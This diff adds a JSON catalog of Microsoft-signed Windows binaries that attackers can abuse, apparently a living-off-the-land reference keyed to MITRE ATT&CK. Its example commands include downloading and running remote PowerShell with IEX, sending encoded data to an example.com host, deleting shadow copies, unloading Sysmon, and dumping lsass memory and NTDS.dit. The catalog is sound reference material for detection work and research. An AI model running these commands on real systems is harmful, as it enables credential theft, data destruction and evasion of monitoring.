+   "Download",
+   "Execute"
+  ],
+  "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
+  "example": "squirrel.exe --download {REMOTEURL}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe"
+ },
+ "Stordiag.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Storage diagnostic tool",
+  "example": "stordiag.exe",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\windows\\system32\\stordiag.exe"
+ },
+ "SyncAppvPublishingServer.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used by App-v to get App-v server lists",
+  "example": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\SyncAppvPublishingServer.exe"
+ },
+ "Syncappvpublishingserver.vbs": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Script used related to app-v and publishing server",
+  "example": "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"",
+  "mitre": [
+   "T1216.002"
+  ],
+  "path": "C:\\Windows\\System32\\SyncAppvPublishingServer.vbs"
+ },
+ "Syssetup.dll": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Windows NT System Setup",
+  "example": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\syssetup.dll"
+ },
+ "Tar.exe": {
+  "categories": [
+   "ADS",
+   "Copy"
+  ],
+  "description": "Used by Windows to extract and create archives.",
+  "example": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}",
+  "mitre": [
+   "T1105",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\tar.exe"
+ },
+ "Teams.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Electron runtime binary which runs the Teams application",
+  "example": "teams.exe",
+  "mitre": [
+   "T1218.015"
+  ],
+  "path": "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
+ },
+ "TestWindowRemoteAgent.exe": {
+  "categories": [
+   "Upload"
+  ],
+  "description": "TestWindowRemoteAgent.exe is the command-line tool to establish RPC",
+  "example": "TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000",
+  "mitre": [
+   "T1048"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\RemoteAgent\\TestWindowRemoteAgent.exe"
+ },
+ "Tracker.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Tool included with Microsoft .Net Framework.",
+  "example": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "no default"
+ },
+ "Ttdinject.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)",
+  "example": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Windows\\System32\\ttdinject.exe"
+ },
+ "Tttracer.exe": {
+  "categories": [
+   "Dump",
+   "Execute"
+  ],
+  "description": "Used by Windows 1809 and newer to Debug Time Travel",
+  "example": "tttracer.exe {PATH_ABSOLUTE:.exe}",
+  "mitre": [
+   "T1003",
+   "T1127"
+  ],
+  "path": "C:\\Windows\\System32\\tttracer.exe"
+ },
+ "Unregmp2.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Microsoft Windows Media Player Setup Utility",
+  "example": "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Windows\\System32\\unregmp2.exe"
+ },
+ "Update.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Download",
+   "Execute"
+  ],
+  "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
+  "example": "Update.exe --download {REMOTEURL}",
+  "mitre": [
+   "T1070",
+   "T1218",
+   "T1547"
+  ],
+  "path": "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe"
+ },
+ "Url.dll": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Internet Shortcut Shell Extension DLL.",
+  "example": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\url.dll"
+ },
+ "UtilityFunctions.ps1": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "PowerShell Diagnostic Script",
+  "example": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"",
+  "mitre": [
+   "T1216"
+  ],
+  "path": "C:\\Windows\\diagnostics\\system\\Networking\\UtilityFunctions.ps1"
+ },
+ "VSDiagnostics.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Command-line tool used for performing diagnostics.",
+  "example": "VSDiagnostics.exe start 1 /launch:{PATH:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe"
+ },
+ "VSIISExeLauncher.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Binary will execute specified binary. Part of VS/VScode installation.",
+  "example": "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\"",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\Extensions\\Microsoft\\Web Tools\\ProjectSystem\\VSIISExeLauncher.exe"
+ },
+ "VSLaunchBrowser.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "Microsoft Visual Studio browser launcher tool for web applications debugging",
+  "example": "VSLaunchBrowser.exe .exe {REMOTEURL:.exe}",
+  "mitre": [
+   "T1105",
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\VSLaunchBrowser.exe"
+ },
+ "Verclsid.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used to verify a COM object before it is instantiated by Windows Explorer",
+  "example": "verclsid.exe /S /C {CLSID}",
+  "mitre": [
+   "T1218.012"
+  ],
+  "path": "C:\\Windows\\System32\\verclsid.exe"
+ },
+ "Visio.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Visio Executable",
+  "example": "Visio.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office\\Office14\\Visio.exe"
+ },
+ "VisualUiaVerifyNative.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.",
+  "example": "VisualUiaVerifyNative.exe",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\arm64\\UIAVerify\\VisualUiaVerifyNative.exe"
+ },
+ "Vshadow.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "VShadow is a command-line tool that can be used to create and manage volume shadow copies.",
+  "example": "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\vshadow.exe"
+ },
+ "Vssadmin.exe": {
+  "categories": [
+   "Tamper"
+  ],
+  "description": "Volume Shadow Copy Service administrative command-line tool",
+  "example": "vssadmin delete shadows /all /quiet",
+  "mitre": [
+   "T1490"
+  ],
+  "path": "C:\\Windows\\System32\\vssadmin.exe"
+ },
+ "WFMFormat.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.",
+  "example": "WFMFormat.exe",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\there\\is\\no\\default\\installation\\path\\WFMFormat.exe"
+ },
+ "Wab.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows address book manager",
+  "example": "wab.exe",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\Windows Mail\\wab.exe"
+ },
+ "Wfc.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).",
+  "example": "wfc.exe {PATH_ABSOLUTE:.xoml}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\wfc.exe"
+ },
+ "WinDbg.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Debugger for advanced user-mode and kernel-mode debugging.",
+  "example": "windbg.exe -g {CMD}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe"
+ },
+ "WinProj.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Project Executable",
+  "example": "WinProj.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft Office\\Office14\\WinProj.exe"
+ },
+ "Winword.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office binary",
+  "example": "winword.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe"
+ },
+ "Wlrmdr.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Logon Reminder executable",
+  "example": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "c:\\windows\\system32\\wlrmdr.exe"
+ },
+ "Wmic.exe": {
+  "categories": [
+   "ADS",
+   "Copy",
+   "Execute"
+  ],
+  "description": "The WMI command-line (WMIC) utility provides a command-line interface for WMI",
+  "example": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"",
+  "mitre": [
+   "T1105",
+   "T1218",
+   "T1518.001",
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\wbem\\wmic.exe"
+ },
+ "WorkFolders.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Work Folders",
+  "example": "WorkFolders",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\WorkFolders.exe"
+ },
+ "Wscript.exe": {
+  "categories": [
+   "ADS"
+  ],
+  "description": "Used by Windows to execute scripts",
+  "example": "wscript //e:vbscript {PATH}:script.vbs",
+  "mitre": [
+   "T1564.004"
+  ],
+  "path": "C:\\Windows\\System32\\wscript.exe"
+ },
+ "Wsl.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "Windows subsystem for Linux executable",
+  "example": "wsl.exe -e /mnt/c/Windows/System32/calc.exe",
+  "mitre": [
+   "T1105",
+   "T1202",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\wsl.exe"
+ },
+ "Wsreset.exe": {
+  "categories": [
+   "UAC Bypass"
+  ],
+  "description": "Used to reset Windows Store settings according to its manifest file",
+  "example": "wsreset.exe",
+  "mitre": [
+   "T1548.002"
+  ],
+  "path": "C:\\Windows\\System32\\wsreset.exe"
+ },
+ "XBootMgr.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Performance Toolkit binary used to start performance traces.",
+  "example": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -callBack {PATH:.exe}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Program Files\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgr.exe"
+ },
+ "XBootMgrSleep.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.",
+  "example": "xbootmgrsleep.exe 1000 {PATH:.exe}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Program Files\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgrsleep.exe"
+ },
+ "Xwizard.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "Execute custom class that has been added to the registry or download a file with Xwizard.exe",
+  "example": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}",
+  "mitre": [
+   "T1105",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\xwizard.exe"
+ },
+ "Zipfldr.dll": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Compressed Folder library",
+  "example": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",
+  "mitre": [
+   "T1218.011"
+  ],
+  "path": "c:\\windows\\system32\\zipfldr.dll"
+ },
+ "adplus.exe": {
+  "categories": [
+   "Dump",
+   "Execute"
+  ],
+  "description": "Debugging tool included with Windows Debugging Tools",
+  "example": "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet",
+  "mitre": [
+   "T1003.001",
+   "T1127"
+  ],
+  "path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\adplus.exe"
+ },
+ "cmdl32.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Connection Manager Auto-Download",
+  "example": "cmdl32 /vpn /lan %cd%\\config",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Windows\\System32\\cmdl32.exe"
+ },
+ "code.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "VSCode binary, also portable (CLI) version",
+  "example": "code.exe tunnel --accept-server-license-terms --name \"tunnel-name\"",
+  "mitre": [
+   "T1219.001"
+  ],
+  "path": "C:\\Users\\<username>\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"
+ },
+ "coregen.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Micro",
+  "example": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name",
+  "mitre": [
+   "T1055",
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe"
+ },
+ "csi.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Command line interface included with Visual Studio.",
+  "example": "csi.exe {PATH:.cs}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "c:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\MSBuild\\15.0\\Bin\\Roslyn\\csi.exe"
+ },
+ "devtunnel.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Binary to enable forwarded ports on windows operating systems.",
+  "example": "devtunnel.exe host -p 8080",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Users\\<username>\\AppData\\Local\\Temp\\.net\\devtunnel\\devtunnel.exe"
+ },
+ "dnx.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": ".NET Execution environment file included with .NET.",
+  "example": "dnx.exe {PATH_ABSOLUTE:folder}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "no default"
+ },
+ "dotnet-counters.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": ".NET diagnostic tool for monitoring performance counters of .NET applications in real-time. Installed via 'dotnet tool install --global dotnet-counters' (.NET SDK required).",
+  "example": "dotnet-counters.exe collect --duration 1 -- {PATH:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Users\\<user>\\.dotnet\\tools\\dotnet-counters.exe"
+ },
+ "dotnet-trace.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": ".NET diagnostic tool for collecting runtime traces from .NET applications. Installed via 'dotnet tool install --global dotnet-trace' (.NET SDK required).",
+  "example": "dotnet-trace.exe collect --duration 00:00:01 -- {PATH:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Users\\<user>\\.dotnet\\tools\\dotnet-trace.exe"
+ },
+ "dsdbutil.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
+  "example": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"",
+  "mitre": [
+   "T1003.003"
+  ],
+  "path": "C:\\Windows\\System32\\dsdbutil.exe"
+ },
+ "dtutil.exe": {
+  "categories": [
+   "Copy"
+  ],
+  "description": "Microsoft command line utility used to manage SQL Server Integration Services packages.",
+  "example": "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files\\Microsoft SQL Server\\<version>\\DTS\\Binn\\dtutil.exe"
+ },
+ "fltMC.exe": {
+  "categories": [
+   "Tamper"
+  ],
+  "description": "Filter Manager Control Program used by Windows",
+  "example": "fltMC.exe unload SysmonDrv",
+  "mitre": [
+   "T1562.001"
+  ],
+  "path": "C:\\Windows\\System32\\fltMC.exe"
+ },
+ "iediagcmd.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Diagnostics Utility for Internet Explorer",
+  "example": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Program Files\\Internet Explorer\\iediagcmd.exe"
+ },
+ "iscsicpl.exe": {
+  "categories": [
+   "UAC Bypass"
+  ],
+  "description": "Microsoft iSCSI Initiator Control Panel tool",
+  "example": "c:\\windows\\syswow64\\iscsicpl.exe",
+  "mitre": [
+   "T1548.002"
+  ],
+  "path": "c:\\windows\\system32\\iscsicpl.exe"
+ },
+ "msedge_proxy.exe": {
+  "categories": [
+   "Download",
+   "Execute"
+  ],
+  "description": "Microsoft Edge Browser",
+  "example": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}",
+  "mitre": [
+   "T1105",
+   "T1218.015"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe"
+ },
+ "msedgewebview2.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
+  "example": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"",
+  "mitre": [
+   "T1218.015"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\114.0.1823.43\\msedgewebview2.exe"
+ },
+ "msoxmled.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "Microsoft Office XML Editor, used to handle XML documents in Microsoft Office.",
+  "example": "msoxmled.exe /verb open {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files\\Microsoft Office\\root\\vfs\\ProgramFilesCommonX64\\Microsoft Shared\\Office16\\msoxmled.exe"
+ },
+ "msxsl.exe": {
+  "categories": [
+   "ADS",
+   "AWL Bypass",
+   "Download",
+   "Execute"
+  ],
+  "description": "Command line utility used to perform XSL transformations.",
+  "example": "msxsl.exe {PATH:.xml} {PATH:.xsl}",
+  "mitre": [
+   "T1105",
+   "T1220",
+   "T1564"
+  ],
+  "path": "no default"
+ },
+ "ntdsutil.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Command line utility used to export Active Directory.",
+  "example": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q",
+  "mitre": [
+   "T1003.003"
+  ],
+  "path": "C:\\Windows\\System32\\ntdsutil.exe"
+ },
+ "odbcad32.exe": {
+  "categories": [
+   "UAC Bypass"
+  ],
+  "description": "ODBC Data Source Administrator to manage User/System DSNs and ODBC drivers.",
+  "example": "odbcad32.exe",
+  "mitre": [
+   "T1548.002"
+  ],
+  "path": "c:\\windows\\system32\\odbcad32.exe"
+ },
+ "rcsi.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Non-Interactive command line inerface included with Visual Studio.",
+  "example": "rcsi.exe {PATH:.csx}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "no default"
+ },
+ "rdrleakdiag.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Microsoft Windows resource leak diagnostic tool",
+  "example": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1",
+  "mitre": [
+   "T1003",
+   "T1003.001"
+  ],
+  "path": "c:\\windows\\system32\\rdrleakdiag.exe"
+ },
+ "scp.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Used for uploading or downloading files over SSH.",
+  "example": "scp.exe -o ProxyCommand=\"{CMD}\" . localhost:.",
+  "mitre": [
+   "T1202",
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\OpenSSH\\scp.exe"
+ },
+ "setupugc.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Setup Unattend Generic Command Processor used during Windows deployment.",
+  "example": "setupugc.exe specialize",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\setupugc.exe"
+ },
+ "ssh.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.",
+  "example": "ssh localhost \"{CMD}\"",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "c:\\windows\\system32\\OpenSSH\\ssh.exe"
+ },
+ "te.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).",
+  "example": "te.exe {PATH:.wsc}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "no default"
+ },
+ "vbc.exe": {
+  "categories": [
+   "Compile"
+  ],
+  "description": "Binary file used for compile vbs code",
+  "example": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe"
+ },
+ "vsjitdebugger.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Just-In-Time (JIT) debugger included with Visual Studio",
+  "example": "Vsjitdebugger.exe {PATH:.exe}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "c:\\windows\\system32\\vsjitdebugger.exe"
+ },
+ "vsls-agent.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Agent for Visual Studio Live Share (Code Collaboration)",
+  "example": "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Agent\\vsls-agent.exe"
+ },
+ "vstest.console.exe": {
+  "categories": [
+   "AWL Bypass"
+  ],
+  "description": "VSTest.Console.exe is the command-line tool to run tests",
+  "example": "vstest.console.exe {PATH:.dll}",
+  "mitre": [
+   "T1127"
+  ],
+  "path": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\vstest.console.exe"
+ },
+ "wbadmin.exe": {
+  "categories": [
+   "Dump"
+  ],
+  "description": "Windows Backup Administration utility",
+  "example": "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet",
+  "mitre": [
+   "T1003.003"
+  ],
+  "path": "C:\\Windows\\System32\\wbadmin.exe"
+ },
+ "wbemtest.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "WMI/WBEM Test Binary",
+  "example": "wbemtest.exe",
+  "mitre": [
+   "T1047"
+  ],
+  "path": "c:\\windows\\system32\\wbem\\wbemtest.exe"
+ },
+ "winfile.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows File Manager executable",
+  "example": "winfile.exe {PATH:.exe}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Windows\\System32\\winfile.exe"
+ },
+ "winget.exe": {
+  "categories": [
+   "AWL Bypass",
+   "Download",
+   "Execute"
+  ],
+  "description": "Windows Package Manager tool",
+  "example": "winget.exe install --manifest {PATH:.yml}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe"
+ },
+ "winrm.vbs": {
+  "categories": [
+   "AWL Bypass",
+   "Execute"
+  ],
+  "description": "Script used for manage Windows RM settings",
+  "example": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"{CMD}\"} -r:http://target:5985",
+  "mitre": [
+   "T1216",
+   "T1220"
+  ],
+  "path": "C:\\Windows\\System32\\winrm.vbs"
+ },
+ "write.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Write",
+  "example": "write.exe",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\write.exe"
+ },
+ "wsb.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Sandbox command-line interface. Creates, lists, controls, and executes commands inside Windows Sandbox sessions from the host CLI.",
+  "example": "wsb start --config \"<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>\"\nwsb exec -r System --id YOUR_ID",
+  "mitre": [
+   "T1564.006"
+  ],
+  "path": "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps\\wsb.exe"
+ },
+ "wt.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Terminal",
+  "example": "wt.exe {CMD}",
+  "mitre": [
+   "T1202"
+  ],
+  "path": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_<version_packageid>\\wt.exe"
+ },
+ "wuauclt.exe": {
+  "categories": [
+   "Execute"
+  ],
+  "description": "Windows Update Client",
+  "example": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer",
+  "mitre": [
+   "T1218"
+  ],
+  "path": "C:\\Windows\\System32\\wuauclt.exe"
+ },
+ "xsd.exe": {
+  "categories": [
+   "Download"
+  ],
+  "description": "XML Schema Definition Tool included with the Windows Software Development Kit (SDK).",
+  "example": "xsd.exe {REMOTEURL}",
+  "mitre": [
+   "T1105"
+  ],
+  "path": "C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\bin\\NETFX <version> Tools\\xsd.exe"
+ }
+}
